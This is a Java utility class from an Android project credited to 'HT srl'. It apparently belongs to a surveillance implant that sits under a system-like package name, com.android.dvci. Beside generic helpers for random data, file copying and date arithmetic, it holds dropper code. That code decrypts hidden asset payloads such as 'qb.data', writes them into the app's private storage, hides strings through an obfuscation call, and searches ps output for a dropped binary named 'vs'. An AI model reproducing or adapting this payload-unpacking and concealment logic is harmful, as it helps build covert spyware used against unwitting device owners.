/* ******************************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 01-dec-2010
 *******************************************************/

package com.android.dvci.util;

import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.AssetManager;
import android.speech.RecognizerIntent;

import com.android.dvci.Root;
import com.android.dvci.Status;
import com.android.dvci.auto.Cfg;
import com.android.dvci.crypto.Keys;
import com.android.dvci.file.AutoFile;
import com.android.mm.M;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.security.SecureRandom;
import java.util.Calendar;
import java.util.Date;
import java.util.GregorianCalendar;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

// TODO: Auto-generated Javadoc

/**
 * The Class Utils.
 */
public final class Utils {

	/**
	 * The debug.
	 */
	private static final String TAG = "Utils"; //$NON-NLS-1$

	private Utils() {
	}

	;

	/**
	 * Sleep.
	 *
	 * @param t ms to sleep
	 */
	public static void sleep(final int t) {
		try {
			if (Cfg.DEBUG) {
				if (t < 50) {
					Check.log(TAG + " (sleep) do you mean s? it's ms");
				}
			}
			Thread.sleep(t);
		} catch (final InterruptedException e) {
			if (Cfg.EXCEPTION) {
				Check.log(e);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " sleep() throwed an exception");//$NON-NLS-1$
			}
			if (Cfg.DEBUG) {
				Check.log(e);//$NON-NLS-1$
			}
		}
	}

	/**
	 * The rand.
	 */
	static SecureRandom rand = new SecureRandom();

	/**
	 * Gets the unique id.
	 *
	 * @return the unique id
	 */
	public static long getRandom() {
		return rand.nextLong();
	}
	public static long getRandom(int max) {
		return rand.nextInt(max);
	}
	public static int[] getRandomIntArray(int size) {
		int[] r = new int[size];
		for (int i = 0; i < size; i++) {
			r[i] = rand.nextInt();
		}
		return r;
	}

	public static byte[] getRandomByteArray(int sizeMin, int sizeMax) {
		int size = rand.nextInt(sizeMax - sizeMin) + sizeMin;

		byte[] randData = new byte[size];
		rand.nextBytes(randData);

		return randData;
	}

	/**
	 * Gets the time stamp in millis.
	 *
	 * @return the time stamp
	 */
	public static long getTimeStamp() {
		return System.currentTimeMillis();
	}


	public static byte[] concat(byte[]... arrays) {
		int size = 0;
		for (int i = 0; i < arrays.length; i++) {
			size += arrays[i].length;
		}

		byte[] result = new byte[size];
		size = 0;
		for (int i = 0; i < arrays.length; i++) {
			System.arraycopy(arrays[i], 0, result, size, arrays[i].length);
			size += arrays[i].length;
		}

		return result;
	}

	public static byte[] getAsset(String asset) {
		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getAsset): " + asset);
			}
			AssetManager assetManager = Status.getAppContext().getResources().getAssets();
			InputStream stream = assetManager.open(asset);
			byte[] ret = ByteArray.inputStreamToBuffer(stream, 0);
			//stream.close();

			return ret;
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getAsset): " + e);
			}
			return new byte[]{};
		}
	}

	public static InputStream getAssetStream(String asset) {
		try {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getAsset): " + asset);
			}
			AssetManager assetManager = Status.getAppContext().getResources().getAssets();
			InputStream stream = assetManager.open(asset);

			return stream;
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (getAsset): " + e);
			}
			return null;
		}
	}

	public static void copy(File src, File dst) throws IOException {
		InputStream in = new FileInputStream(src);
		OutputStream out = new FileOutputStream(dst);

		// Transfer bytes from in to out
		byte[] buf = new byte[1024];
		int len;
		while ((len = in.read(buf)) > 0) {
			out.write(buf, 0, len);
		}
		in.close();
		out.close();
	}

	private static boolean streamDecodeWriteSimple(String filename, InputStream stream) {
		try {
			InputStream in = Root.decodeEncSimple(stream);
			return streamDecodeWriteInternal(filename, in);
		} catch (Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (streamDecodeWriteSimple): " + ex);
			}

			return false;
		}
	}

	private static String streamDecodeSimple(InputStream stream) {
		try {
			InputStream in = Root.decodeEncSimple(stream);
			return StringUtils.inputStreamToString(in);
		} catch (Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (streamDecodeWriteSimple): " + ex);
			}

			return "";
		}
	}

	private static boolean streamDecodeWriteAnt(final String filename, String asset, InputStream stream) {
		try{
			InputStream in = Root.decodeEnc(stream, Cfg.RNDDB + asset.charAt(0));
			return streamDecodeWriteInternal(filename, in);
		} catch (Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (streamDecodeWriteAnt): " + ex);
			}

			return false;
		}
	}

	private static boolean streamDecodeWriteInternal(final String asset, InputStream in){
		try {
			final FileOutputStream out = Status.getAppContext().openFileOutput(asset, Context.MODE_PRIVATE);
			byte[] buf = new byte[1024];
			int numRead = 0;

			while ((numRead = in.read(buf)) >= 0) {
				out.write(buf, 0, numRead);
			}

			out.close();

			String pack = Status.self().getAppContext().getPackageName();
			final String installPath = String.format(M.e("/data/data/%s/files"), pack);

			AutoFile file = new AutoFile(installPath, asset);
			if (!file.exists() || !file.canRead()) {
				return false;
			}
		} catch (Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " (streamDecodeWrite): " + ex);
			}

			return false;
		}

		return true;
	}

	public static boolean dumpAsset(String asset, String filename) {
		if (Cfg.DEBUG) {
			Check.asserts(asset.endsWith(".data"), "asset should end in .data");
		}
		InputStream stream = getAssetStream(asset);
		if(stream == null){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (dumpAsset), ERROR cannot find resource: %s", asset);
			}
			return false;
		}
		return streamDecodeWriteAnt(filename, asset, stream);
	}

	public static boolean dumpAssetPayload(String filename) {

		String asset = M.e("qb.data");

		if (Cfg.DEBUG) {
			Check.log(" (dumpAssetPayload)");
		}
		InputStream stream = getAssetStream(asset);
		if(stream == null){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (dumpAssetPayload), ERROR cannot find resource: %s", asset);
			}
			return false;
		}
		return streamDecodeWriteSimple(filename, stream);
	}

	public static String readAssetPayload(String asset) {

		if (Cfg.DEBUG) {
			Check.log(" (readAssetPayload)");
		}
		InputStream stream = getAssetStream(asset);
		if(stream == null){
			if (Cfg.DEBUG) {
				Check.log(TAG + " (dumpAssetPayload), ERROR cannot find resource: %s", asset);
			}
			return "";
		}

		String ret = null;
		if(Cfg.DEBUG){
			try {
				ret =  StringUtils.inputStreamToString(stream);

			} catch (IOException e) {
				//
			}
		}else{
			ret = streamDecodeSimple(stream);
		}
		return ret;
	}



	/**
	 * checks if a pid is running,
	 *
	 * @param pid
	 *            the pid to search
	 */
	public static boolean pidAlive(String pid){

		AutoFile file = new AutoFile(M.e("/proc/"), pid);
		if(file!=null && file.exists()){
			return true;
		}
		return false;
	}

	/**
	 * Returns the pid of a matching line of the ps command, null
	 * if not found
	 *
	 * @param lookFor
	 *            the string to search for
	 */
public static String pidOf(String lookFor,String owner) {
	String line;
	//Executable file name of the application to check.
	String pid=null;
	boolean applicationIsOk = false;
	//Running command that will get all the working processes.
	Process proc = null;
	try {
		proc = Runtime.getRuntime().exec("ps");
	} catch (IOException e) {
		e.printStackTrace();
	}
	if(proc != null) {
		InputStream stream = proc.getInputStream();
		BufferedReader reader = new BufferedReader(new InputStreamReader(stream));
//Parsing the input stream.
		try {
			while ((line = reader.readLine()) != null) {
				Pattern pattern = Pattern.compile(lookFor);
				Matcher matcher = pattern.matcher(line);
				if (matcher.find()) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (pidOf): find=" + lookFor + " in:\n" + line);
					}
						//esempio u0_a72    24334 1     5900   5280  ffffffff 00000000 R /data/data/com.android.dvci/files/vs
						String[] splited = line.split("\\s+");
						if(splited.length>3){
							if( !StringUtils.isEmpty(owner) && !splited[0].contains(owner) ){
								if (Cfg.DEBUG) {
									Check.log(TAG + " (pidOf): owner =" + owner + "NOT in =" + splited[0]+" skip it");
								}
								continue;
							}
							int p = -1;

							try {
								p = Integer.parseInt(splited[1]);
							}catch(NumberFormatException nf){
								if (Cfg.DEBUG) {
									Check.log(TAG + " (pidOf): failure parsing:"+splited[1]);
								}
							}
							if(p>0){
								pid = new String(splited[1]);
							}

						}
					break;
				}
			}
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (pidOf): exception parsing:",e);
			}
		}
	}
	return pid;
}
public static String pidOf(String lookFor){
		return pidOf(lookFor,null);
}
	public static int getDaysBetween (long start, long end)   {

		boolean negative = false;
		if (end> start)  {
			negative = true;
			long temp = start;
			start = end;
			end = temp;
		}

		GregorianCalendar cal = new GregorianCalendar();
		cal.setTime(new Date(start));
		cal.set(Calendar.HOUR_OF_DAY, 0);
		cal.set(Calendar.MINUTE, 0);
		cal.set(Calendar.SECOND, 0);
		cal.set(Calendar.MILLISECOND, 0);

		GregorianCalendar calEnd = new GregorianCalendar();
		calEnd.setTime(new Date(end));
		calEnd.set(Calendar.HOUR_OF_DAY, 0);
		calEnd.set(Calendar.MINUTE, 0);
		calEnd.set(Calendar.SECOND, 0);
		calEnd.set(Calendar.MILLISECOND, 0);


		if (cal.get(Calendar.YEAR) == calEnd.get(Calendar.YEAR))   {
			if (negative)
				return (calEnd.get(Calendar.DAY_OF_YEAR) - cal.get(Calendar.DAY_OF_YEAR)) * -1;
			return calEnd.get(Calendar.DAY_OF_YEAR) - cal.get(Calendar.DAY_OF_YEAR);
		}

		int days = 0;
		while (calEnd.after(cal))    {
			cal.add (Calendar.DAY_OF_YEAR, 1);
			days++;
		}
		if (negative)
			return days * -1;
		return days;
	}

	/**
     * Checks availability of speech recognizing Activity
     *
     * @return true – if Activity there available, false – if Activity is absent
     */
    public static boolean isSpeechRecognitionActivityPresent() {
        try {
            // getting an instance of package manager
            PackageManager pm = Status.getAppContext().getPackageManager();
            // a list of activities, which can process speech recognition Intent
            List activities = pm.queryIntentActivities(new Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH), 0);

            if (activities.size() != 0) {    // if list not empty
                return true;                // then we can recognize the speech
            }
        } catch (Exception e) {

        }

        return false; // we have no activities to recognize the speech
    }
}
